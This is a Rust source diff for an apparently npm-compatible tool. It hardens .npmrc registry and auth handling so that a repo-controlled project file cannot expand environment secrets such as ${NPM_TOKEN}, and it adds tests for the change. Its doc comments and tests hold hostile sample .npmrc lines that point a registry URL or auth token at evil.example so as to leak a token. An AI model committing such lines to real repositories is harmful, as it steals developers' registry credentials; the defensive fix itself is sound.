@@ -10,7 +10,7 @@
 //! `dist.shasum` (sha1) is the fail-closed fallback for ancient publishes that
 //! predate `integrity`.
 
-use std::path::{Component, PathBuf};
+use std::path::{Component, Path, PathBuf};
 
 use anyhow::{Context, Result, bail};
 use serde_json::Value;
@@ -18,7 +18,6 @@ use sha1::Sha1;
 use sha2::{Digest, Sha512};
 
 use crate::version_management::download::{self, Auth};
-use crate::workspace::scripts::npmrc_value;
 
 /// A single resolved version's dist: where to fetch it, how to verify it, and the
 /// path within the extracted `package/` dir to the runnable bin.
@@ -99,25 +98,129 @@ pub fn registry_config(root: &std::path::Path) -> RegistryConfig {
     }
 
     // 2–4. The ecosystem-standard stack: env override, then `.npmrc registry`,
-    // then public. The selection rule is the pure [`resolve_base`].
+    // then public. The selection rule is the pure [`resolve_base`]. The PROJECT
+    // `.npmrc` (repo-controlled) and the USER `~/.npmrc` (operator-controlled) are
+    // read SEPARATELY so their values can carry different trust for `${VAR}`
+    // expansion (see [`project_npmrc_trusted`] / [`resolve_base`]).
+    let project_trusted = project_npmrc_trusted(root);
+    let user_registry = home_npmrc().and_then(|p| read_npmrc_key(&p, "registry"));
     let base = resolve_base(
         env_nonempty("npm_config_registry"),
-        npmrc_value(root, "registry"),
+        read_npmrc_key(&root.join(".npmrc"), "registry"),
+        user_registry,
+        project_trusted,
     );
-    let auth = npmrc_auth_for(root, &base);
+    let auth = npmrc_auth_for(root, &base, project_trusted);
     RegistryConfig { base, auth }
 }
 
+/// Whether the PROJECT-level `.npmrc` is trusted to expand `${VAR}` environment
+/// references in its `registry` / auth values. OFF by default: a project `.npmrc`
+/// is repo-controlled — a clone or a PR fully authors it — so it must NOT be able
+/// to interpolate a secret from the caller's environment into a registry URL or
+/// auth credential bound for an attacker-chosen host. That interpolation happens
+/// before any lifecycle script runs, so script-blocking can't stop it; the only
+/// defense is to not expand it. This is the pnpm GHSA-3qhv-2rgh-x77r class:
+/// https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r (fixed in
+/// pnpm 10.34.2 and 11.5.3).
+///
+/// Opt back in the pnpm-compatible way: `PNPM_CONFIG_NPMRC_AUTH_FILE` (pnpm's
+/// `npmrcAuthFile`) is a PATH to the trusted auth file, not a boolean. pnpm
+/// re-trusts the project `.npmrc` ONLY when that path resolves to the project's
+/// own `.npmrc` (`PNPM_CONFIG_NPMRC_AUTH_FILE=.npmrc`, relative to the working
+/// dir) — a value pointing elsewhere (an absolute CI secret file) names a
+/// different trusted file and leaves the repo `.npmrc` UNtrusted. So gate on the
+/// resolved path matching `<root>/.npmrc`, never on mere presence — presence-trust
+/// would re-open the exfiltration for anyone who set the var to a non-project
+/// path. The flag comes from the ENVIRONMENT (a cloned/PR'd repo can't set it for
+/// you), and the USER `~/.npmrc` is always trusted regardless — it is the
+/// operator's own file, the home of the normal `${NPM_TOKEN}` pattern.
+fn project_npmrc_trusted(root: &std::path::Path) -> bool {
+    let Some(raw) = env_nonempty("PNPM_CONFIG_NPMRC_AUTH_FILE") else {
+        return false;
+    };
+    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    auth_file_trusts_project(&raw, &cwd, root)
+}
+
+/// PURE: does the configured `PNPM_CONFIG_NPMRC_AUTH_FILE` path point AT the
+/// project's own `<root>/.npmrc`? A relative value resolves against `cwd` (pnpm's
+/// rule). Comparison is fail-CLOSED: it trusts only when both paths canonicalize
+/// to the same real file; if either can't be canonicalized (e.g. the file doesn't
+/// exist), it returns false rather than risk trusting a repo-controlled file.
+fn auth_file_trusts_project(configured: &str, cwd: &Path, root: &Path) -> bool {
+    let p = Path::new(configured);
+    let resolved = if p.is_absolute() {
+        p.to_path_buf()
+    } else {
+        cwd.join(p)
+    };
+    let project = root.join(".npmrc");
+    match (resolved.canonicalize(), project.canonicalize()) {
+        (Ok(a), Ok(b)) => a == b,
+        _ => false,
+    }
+}
+
+/// The user-level `~/.npmrc` path, if a home directory resolves.
+fn home_npmrc() -> Option<PathBuf> {
+    dirs_next::home_dir().map(|h| h.join(".npmrc"))
+}
+
+/// Read a single `key=value` setting from ONE `.npmrc` file — no project→user
+/// fallback, no `${VAR}` expansion (the caller applies trust-aware expansion).
+/// Surrounding quotes are stripped and a blank value is treated as absent, matching
+/// [`crate::workspace::scripts::npmrc_value`]. Kept local so registry resolution can
+/// read the PROJECT and USER files independently and expand each per its trust.
+fn read_npmrc_key(path: &std::path::Path, key: &str) -> Option<String> {
+    let content = std::fs::read_to_string(path).ok()?;
+    for line in content.lines() {
+        let trimmed = line.trim();
+        if let Some((k, value)) = trimmed.split_once('=')
+            && k.trim() == key
+        {
+            let value = value.trim().trim_matches('"').trim_matches('\'');
+            if !value.is_empty() {
+                return Some(value.to_string());
+            }
+        }
+    }
+    None
+}
+
 /// PURE base selection for the ecosystem-standard stack (the COREPACK override is
-/// handled by the caller, ABOVE this): `npm_config_registry` wins over the
-/// `.npmrc registry` value, which wins over the public registry. Trailing slash
-/// trimmed; `${VAR}` interpolated. Unit-tested without mutating process env.
-fn resolve_base(npm_config_registry: Option<String>, npmrc_registry: Option<String>) -> String {
-    let raw = npm_config_registry
-        .filter(|s| !s.trim().is_empty())
-        .or(npmrc_registry)
-        .unwrap_or_else(|| PUBLIC_REGISTRY.to_string());
-    interpolate_env(&raw).trim_end_matches('/').to_string()
+/// handled by the caller, ABOVE this). Precedence, most specific first:
+/// `npm_config_registry` (env) > project `.npmrc registry` > user `~/.npmrc
+/// registry` > the public registry. Trailing slash trimmed.
+///
+/// `${VAR}` expansion is TRUST-AWARE. The env override and the user `~/.npmrc`
+/// value are operator-controlled, so they always expand. The PROJECT `.npmrc`
+/// value is repo-controlled, so it expands ONLY when `project_trusted`; untrusted,
+/// it is used LITERALLY. A hostile `registry=https://evil.example/${NPM_TOKEN}/`
+/// committed to a repo therefore sends the literal `${NPM_TOKEN}` placeholder over
+/// the wire, never the caller's secret (GHSA-3qhv-2rgh-x77r). Unit-tested without
+/// mutating process env — the untrusted path needs no environment at all.
+fn resolve_base(
+    npm_config_registry: Option<String>,
+    project_npmrc_registry: Option<String>,
+    user_npmrc_registry: Option<String>,
+    project_trusted: bool,
+) -> String {
+    if let Some(raw) = npm_config_registry.filter(|s| !s.trim().is_empty()) {
+        return interpolate_env(&raw).trim_end_matches('/').to_string();
+    }
+    if let Some(raw) = project_npmrc_registry.filter(|s| !s.trim().is_empty()) {
+        let value = if project_trusted {
+            interpolate_env(&raw)
+        } else {
+            raw
+        };
+        return value.trim_end_matches('/').to_string();
+    }
+    if let Some(raw) = user_npmrc_registry.filter(|s| !s.trim().is_empty()) {
+        return interpolate_env(&raw).trim_end_matches('/').to_string();
+    }
+    PUBLIC_REGISTRY.to_string()
 }
 
 /// `COREPACK_NPM_TOKEN` (bearer) wins over `COREPACK_NPM_USERNAME`+`_PASSWORD`
@@ -176,21 +279,24 @@ fn interpolate_with(value: &str, mut lookup: impl FnMut(&str) -> Option<String>)
 /// matching `registry_base`. This is npm's nerfDart resolution: an auth line is
 /// keyed by a registry URL minus its scheme (`//npm.example.com/path/:_authToken`),
 /// and the most-specific (longest) matching prefix wins.
-fn npmrc_auth_for(root: &std::path::Path, registry_base: &str) -> Option<Auth> {
-    let mut text = String::new();
-    let candidates = [
-        root.join(".npmrc"),
-        dirs_next::home_dir()
-            .map(|h| h.join(".npmrc"))
-            .unwrap_or_default(),
-    ];
-    for path in &candidates {
-        if let Ok(content) = std::fs::read_to_string(path) {
-            text.push_str(&content);
-            text.push('\n');
-        }
-    }
-    parse_npmrc_auth(&text, registry_base, |name| std::env::var(name).ok())
+fn npmrc_auth_for(
+    root: &std::path::Path,
+    registry_base: &str,
+    project_trusted: bool,
+) -> Option<Auth> {
+    let project = std::fs::read_to_string(root.join(".npmrc")).unwrap_or_default();
+    let user = home_npmrc()
+        .and_then(|p| std::fs::read_to_string(p).ok())
+        .unwrap_or_default();
+    // Preserve npm's per-prefix last-writer-wins: project text first, user text
+    // last. Trust is per-source — the user file always expands `${VAR}`; the
+    // project file only when trusted — so a repo-controlled auth line can never
+    // interpolate a secret from the environment unless the operator opted in.
+    parse_npmrc_auth(
+        &[(&project, project_trusted), (&user, true)],
+        registry_base,
+        |name| std::env::var(name).ok(),
+    )
 }
 
 /// PURE auth resolver over already-read `.npmrc` text — no filesystem, no network,
@@ -200,11 +306,18 @@ fn npmrc_auth_for(root: &std::path::Path, registry_base: &str) -> Option<Auth> {
 /// chosen credential is the one whose `//host[/path]` key is the longest prefix of
 /// the base (compared scheme-stripped, npm's nerfDart form).
 ///
+/// `sources` is an ordered list of `(npmrc text, trusted)` layers, LOW precedence
+/// first (later layers overwrite earlier per prefix+field, npm's last-writer-wins
+/// — the caller passes the project file before the user file). `${VAR}` in a
+/// value is expanded through `lookup` ONLY when that source is `trusted`; an
+/// UNTRUSTED (repo-controlled) source keeps `${VAR}` LITERAL, so a committed auth
+/// line cannot interpolate a caller secret into a credential for an
+/// attacker-chosen host (GHSA-3qhv-2rgh-x77r).
+///
 /// Per host-prefix, `:_authToken` (bearer) wins over `:_auth` (basic) wins over
-/// `:username`+`:_password` (basic). All values are `${VAR}`-interpolated through
-/// `lookup`.
+/// `:username`+`:_password` (basic).
 fn parse_npmrc_auth(
-    npmrc: &str,
+    sources: &[(&str, bool)],
     registry_base: &str,
     mut lookup: impl FnMut(&str) -> Option<String>,
 ) -> Option<Auth> {
@@ -221,7 +334,13 @@ fn parse_npmrc_auth(
     }
     let mut by_prefix: rustc_hash::FxHashMap<String, Fields> = rustc_hash::FxHashMap::default();
 
-    for line in npmrc.lines() {
+    // Flatten the layers to one `(line, trusted)` stream, low precedence first, so
+    // a later layer's field overwrites an earlier one for the same prefix (npm's
+    // last-writer-wins) while each line keeps its source's trust.
+    let lines = sources
+        .iter()
+        .flat_map(|(npmrc, trusted)| npmrc.lines().map(move |line| (line, *trusted)));
+    for (line, trusted) in lines {
         let line = line.trim();
         if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
             continue;
@@ -239,10 +358,15 @@ fn parse_npmrc_auth(
             continue;
         };
         let prefix = prefix.trim_end_matches('/');
-        let val = interpolate_with(
-            raw_val.trim().trim_matches('"').trim_matches('\''),
-            &mut lookup,
-        );
+        let raw = raw_val.trim().trim_matches('"').trim_matches('\'');
+        // Trust-aware expansion: only a trusted source interpolates `${VAR}`; an
+        // untrusted (repo-controlled) value stays literal so a committed secret
+        // placeholder can never resolve to the caller's environment.
+        let val = if trusted {
+            interpolate_with(raw, &mut lookup)
+        } else {
+            raw.to_string()
+        };
         let entry = by_prefix.entry(prefix.to_string()).or_default();
         match field {
             "_authToken" => entry.auth_token = Some(val),
@@ -1107,10 +1231,167 @@ mod tests {
         // No project key and no env → the public registry, slash trimmed.
         let empty = dir.join("empty");
         std::fs::create_dir_all(&empty).unwrap();
-        if !env_set && npmrc_value(&empty, "registry").is_none() {
+        if !env_set && read_npmrc_key(&empty.join(".npmrc"), "registry").is_none() {
             assert_eq!(registry_base(&empty), "https://registry.npmjs.org");
         }
         let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// GHSA-3qhv-2rgh-x77r class: a PROJECT `.npmrc` is repo-controlled — a clone
+    /// or PR fully authors it — so a `${VAR}` in its `registry` value must NOT be
+    /// expanded from the caller's environment. A hostile
+    /// `registry=https://evil.example/${NPM_TOKEN}/` sends the LITERAL placeholder,
+    /// never the secret, keeping the exfiltration off the wire.
+    #[test]
+    fn untrusted_project_registry_is_not_env_expanded() {
+        let base = resolve_base(
+            None,
+            Some("https://evil.example/${NPM_TOKEN}/".to_string()),
+            None,
+            false,
+        );
+        assert_eq!(
+            base, "https://evil.example/${NPM_TOKEN}",
+            "an untrusted project `.npmrc` registry must keep `${{NPM_TOKEN}}` literal"
+        );
+    }
+
+    /// The success side of the trust gate: once the operator opts in
+    /// (`project_trusted = true`, via `PNPM_CONFIG_NPMRC_AUTH_FILE`), the project
+    /// `.npmrc` registry DOES expand `${VAR}` — the distinct trusted branch of
+    /// [`resolve_base`], the counterpart to `untrusted_project_registry_is_not_env_expanded`.
+    /// Deterministic without touching process env: an UNDEFINED var expands to
+    /// empty (npm's rule), so the `${...}` is consumed rather than left literal.
+    #[test]
+    fn trusted_project_registry_is_env_expanded() {
+        let base = resolve_base(
+            None,
+            Some("https://r.example/${NUB_UNSET_PROJ_REG_VAR_XYZ}/pkg".to_string()),
+            None,
+            true,
+        );
+        assert_eq!(
+            base, "https://r.example//pkg",
+            "a trusted project `.npmrc` registry must expand `${{VAR}}` (undefined → empty)"
+        );
+    }
+
+    /// The pnpm trust flag is a PATH, not a boolean: it re-trusts the project
+    /// `.npmrc` ONLY when it resolves to that exact file. A value pointing at a
+    /// different auth file must leave the repo `.npmrc` untrusted, or the
+    /// GHSA-3qhv-2rgh-x77r exfiltration reopens for anyone with a non-project
+    /// `PNPM_CONFIG_NPMRC_AUTH_FILE`.
+    #[test]
+    fn auth_file_trusts_project_only_on_exact_path_match() {
+        let dir = std::env::temp_dir().join(format!("nub-authfile-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        std::fs::write(dir.join(".npmrc"), "registry=https://r.example/\n").unwrap();
+        // A different, real auth file elsewhere — the legitimate non-project use.
+        let other = dir.join("creds.npmrc");
+        std::fs::write(&other, "//r.example/:_authToken=tok\n").unwrap();
+
+        // Absolute path AT the project `.npmrc` → trusted.
+        assert!(
+            auth_file_trusts_project(dir.join(".npmrc").to_str().unwrap(), &dir, &dir),
+            "the project's own .npmrc path must trust it"
+        );
+        // Relative `.npmrc` resolved against cwd == root → trusted.
+        assert!(
+            auth_file_trusts_project(".npmrc", &dir, &dir),
+            "a relative `.npmrc` against the project dir must trust it"
+        );
+        // A different auth file → NOT trusted (the reopened-exfiltration case).
+        assert!(
+            !auth_file_trusts_project(other.to_str().unwrap(), &dir, &dir),
+            "a non-project auth file must leave the repo .npmrc untrusted"
+        );
+        // A path that doesn't exist → fail-closed (untrusted).
+        assert!(
+            !auth_file_trusts_project(dir.join("missing.npmrc").to_str().unwrap(), &dir, &dir),
+            "an unresolvable path must fail closed"
+        );
+
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    /// The USER `~/.npmrc` is operator-controlled, so its `registry` value IS
+    /// env-expanded (the normal behavior). Deterministic without touching process
+    /// env: an UNDEFINED var expands to empty (npm's rule), so the `${...}` is
+    /// consumed — proving interpolation ran — rather than left literal.
+    #[test]
+    fn user_registry_is_env_expanded() {
+        let base = resolve_base(
+            None,
+            None,
+            Some("https://r.example/${NUB_UNSET_REG_VAR_XYZ}/pkg".to_string()),
+            false,
+        );
+        assert_eq!(
+            base, "https://r.example//pkg",
+            "a user `~/.npmrc` registry must expand `${{VAR}}` (undefined → empty)"
+        );
+    }
+
+    /// Precedence within the `.npmrc` stack: the project value outranks the user
+    /// value (npm's closer-config-wins) — the trust distinction governs only
+    /// EXPANSION, not which source is selected.
+    #[test]
+    fn project_registry_outranks_user_registry() {
+        let base = resolve_base(
+            None,
+            Some("https://proj.example/".to_string()),
+            Some("https://user.example/".to_string()),
+            false,
+        );
+        assert_eq!(base, "https://proj.example");
+    }
+
+    /// The load-bearing exfiltration guard: an UNTRUSTED (repo-controlled) auth
+    /// line pointed at an attacker host must NOT interpolate a caller secret. The
+    /// credential leaves as the literal `${NPM_TOKEN}` placeholder, so the real
+    /// token never reaches `evil.example` (GHSA-3qhv-2rgh-x77r).
+    #[test]
+    fn untrusted_source_never_expands_auth_env() {
+        let project = "//evil.example/:_authToken=${NPM_TOKEN}\n";
+        let lookup = |name: &str| (name == "NPM_TOKEN").then(|| "s3cr3t".to_string());
+        let auth = parse_npmrc_auth(&[(project, false)], "https://evil.example/", lookup);
+        assert_eq!(
+            auth,
+            Some(Auth::Bearer("${NPM_TOKEN}".to_string())),
+            "an untrusted auth line must stay literal, never expand the secret"
+        );
+    }
+
+    /// A TRUSTED source (the user `~/.npmrc`, or a project file opted in via the
+    /// pnpm trust flag) expands `${NPM_TOKEN}` to the real secret — the normal auth
+    /// pattern is preserved for the operator-controlled path.
+    #[test]
+    fn trusted_source_expands_auth_env() {
+        let user = "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n";
+        let lookup = |name: &str| (name == "NPM_TOKEN").then(|| "s3cr3t".to_string());
+        let auth = parse_npmrc_auth(&[(user, true)], "https://registry.npmjs.org/", lookup);
+        assert_eq!(auth, Some(Auth::Bearer("s3cr3t".to_string())));
+    }
+
+    /// Layering: project (low precedence) then user (high). A trusted user auth
+    /// line overwrites an untrusted project line for the same host-prefix, and the
+    /// user secret expands — the project's literal placeholder is discarded.
+    #[test]
+    fn trusted_user_layer_overrides_untrusted_project_layer() {
+        let project = "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n";
+        let user = "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n";
+        let lookup = |name: &str| (name == "NPM_TOKEN").then(|| "s3cr3t".to_string());
+        let auth = parse_npmrc_auth(
+            &[(project, false), (user, true)],
+            "https://registry.npmjs.org/",
+            lookup,
+        );
+        assert_eq!(
+            auth,
+            Some(Auth::Bearer("s3cr3t".to_string())),
+            "the trusted user layer must win and expand"
+        );
     }
 
     #[test]
